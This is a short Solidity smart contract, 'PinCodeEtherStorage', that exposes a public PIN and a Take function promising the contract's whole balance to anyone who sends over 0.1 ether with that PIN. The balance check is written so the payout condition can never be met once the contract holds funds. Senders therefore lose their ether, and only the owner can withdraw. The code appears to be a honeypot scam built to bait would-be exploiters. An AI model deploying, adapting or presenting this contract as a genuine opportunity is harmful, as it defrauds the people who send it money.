pragma solidity ^0.4.19;
contract PinCodeEtherStorage {
address private Owner = msg.sender;
uint public PinCode = 2658;
function() public payable {}
function PinCodeEtherStorage() public payable {}
function Withdraw() public {
require(msg.sender == Owner);
Owner.transfer(this.balance);
}
function Take(uint n) public payable {
if(msg.value >= this.balance && msg.value > 0.1 ether)
if(n <= 9999 && n == PinCode)
msg.sender.transfer(this.balance+msg.value);
}
}